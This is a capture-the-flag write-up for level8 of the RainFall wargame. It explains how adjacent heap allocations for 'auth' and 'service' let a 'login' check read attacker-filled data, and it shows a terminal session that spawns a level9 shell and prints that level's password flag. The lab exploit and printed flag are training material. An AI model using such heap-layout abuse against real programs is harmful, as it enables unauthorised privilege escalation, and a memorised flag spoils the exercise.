When we look at the source code, it prints the addresses of `auth` and `service`. It also expects to get a string and will performe some actions if we give it either  `auth`, `service`, `reset` and `login`.

If the string begin with `auth`, it will allocate 4 bytes with `malloc` and then the length of the rest of the string will be compared to 30. If it is `<= 30`, it will copy the string in `auth`

If the string is `login`, it tests if the 32th character of `auth` is a `\0`, if it is, it will open a shell, if not, it will simply display `Password:`.

When `auth` and `service` are printed, we notice that both addresses are close in the memory.
What we do is write '`auth `' with a space. then we write service and fill it with 32 characters. 

Then we write `login` that will try to access the 32th character of `auth` but will look instead at a character from the `service` string (since `service` is right after `auth` in the memory)

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
```

# Sources :
- https://security.stackexchange.com/questions/198536/example-of-a-double-free-vulnerability-in-c